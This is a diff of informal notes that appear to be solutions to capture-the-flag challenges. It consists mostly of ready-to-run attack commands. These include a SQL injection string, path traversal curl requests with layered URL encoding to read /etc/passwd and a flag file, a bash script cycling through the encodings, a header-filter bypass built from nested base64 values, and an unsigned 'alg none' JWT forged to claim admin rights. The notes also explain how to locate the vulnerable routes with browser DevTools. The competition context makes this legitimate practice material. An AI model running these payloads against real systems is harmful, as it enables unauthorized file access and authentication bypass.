@@ -58,9 +58,15 @@ SELECT * FROM users WHERE username = '/*!50000*/x'||'1'='1' AND password = 'y'||
 
 
 second one 
-* curl "http://<target-host>/"download"?path=shard/%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
-mix * curl "http://<target-host>/"download"?path=shard/..%2f..%2f..%2fetc%2fpasswd"
-triplin  *curl "http://<target-host>/"download"?path=shard/%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc%25252fpasswd"
+Open the target's Glass Vault page, open DevTools (F12) → Network tab, type a normal value like shard/test.txt into the Upload Reader field, submit it, and look at the request that fires. You need:
+
+The host (e.g. http://team3.nncsc.local or similar)
+The exact route/param (likely something like /challenges/glass-vault/read?path= — confirm the real one)
+* # Variation B - triple encoding
+curl -s -i "<HOST<ROUTE>shard/%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc%25252fpasswd"
+
+# Variation C - encoded slashes only, raw dots (tests if raw filter really blocks it)
+curl -s -i "<HOST><ROUTE>shard/..%2f..%2f..%2fetc%2fpasswd"
 
 #!/bin/bash
 
@@ -70,42 +76,43 @@ TARGET="http://<target-host>"
 # Replace this with the real route + param name from DevTools Network tab
 # (e.g. it might be /download?path= or /files/download?file= etc.)
 ROUTE="/download?path="
-
-echo "=== Variation 1: Mixed encoding (raw dots, encoded slashes) ==="
-curl -s -i "${TARGET}${ROUTE}shard/..%2f..%2f..%2fetc%2fpasswd"
-echo -e "\n\n"
-
-echo "=== Variation 2: Triple encoding ==="
-curl -s -i "${TARGET}${ROUTE}shard/%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc%25252fpasswd"
-echo -e "\n\n"
-
-echo "=== Variation 3 (original double-encoding, for comparison) ==="
-curl -s -i "${TARGET}${ROUTE}shard/%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
-echo -e "\n\n"
+last one 
+curl -s -i "<HOST><ROUTE>shard/%252e%252e%252fflag.txt"
 
 
 third one 
-*echo -n "quiet" | base64
-*STEP1=$(echo -n "edge" | base64)
-echo -n "$STEP1" | base64
 
-* curl -i "http://<target-host>/<route>" \
-  -H "x-quiet-lane: $(echo -n 'quiet' | base64)" \
-  -H "x-mindshield-bypass: $(echo -n "$(echo -n 'edge' | base64)" | base64)" \
+Open the target's Quiet Header page, DevTools → Network tab, click whatever triggers the check (e.g. "Probe Edge" or similar), see the request. You need:
+host , route being probed 
+LANE=$(echo -n "quiet" | base64)
+echo "LANE: $LANE"
+
+STEP1=$(echo -n "edge" | base64)
+BYPASS=$(echo -n "$STEP1" | base64)
+echo "BYPASS: $BYPASS"
+
+curl -s -i "<HOST><ROUTE>" \
+  -H "x-quiet-lane: $LANE" \
+  -H "x-mindshield-bypass: $BYPASS" \
   -H "x-quiet-probe: mirror"
 
-  firth
-  token: * {"alg":"none","typ":"JWT"}
-  pyl *  {"admin":true,"aud":"amber","iss":"mindshield.local","ctx":{"tier":7}}
-
-  command to buld : HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
+  firth :
+   Open the target's Amber Ledger page, open DevTools → Network tab, click "Present Token"
+  The route (likely something like /challenges/amber-ledger/verify or an Authorization header check on a protected route)
+  buit T:
+  HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
 PAYLOAD=$(echo -n '{"admin":true,"aud":"amber","iss":"mindshield.local","ctx":{"tier":7}}' | base64 | tr -d '=' | tr '+/' '-_')
+echo "HEADER: $HEADER"
+echo "PAYLOAD: $PAYLOAD"
+
 TOKEN="${HEADER}.${PAYLOAD}."
 echo "$TOKEN"
 
-use it curl -i "http://<target-host>/<route>" -H "Authorization: Bearer $TOKEN"
+fire target : 
+curl -s -i "<HOST><ROUTE>" -H "Authorization: Bearer $TOKEN"
+curl -s -i "<HOST><ROUTE>" -d "token=$TOKEN"
 
-for solv: echo "$TOKEN"
+ 
 
 
 sixth 
